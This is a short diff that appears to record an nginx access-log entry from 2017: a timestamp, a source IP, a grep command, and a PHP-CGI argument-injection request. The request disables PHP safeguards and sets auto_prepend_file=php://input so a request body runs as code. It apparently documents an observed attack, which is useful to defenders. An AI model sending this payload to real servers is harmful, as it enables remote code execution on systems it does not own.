@@ -1,0 +1,13 @@
+cgi-bin/php?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -d auto_prepend_file=php://input -n
+
+
+[29/Oct/2017 03:04:56]
+
+
+
+81.196.44.23
+
+
+ubuntu@ip-172-31-30-224:/var/log/nginx$ cat access.log | grep 03:04
+
+
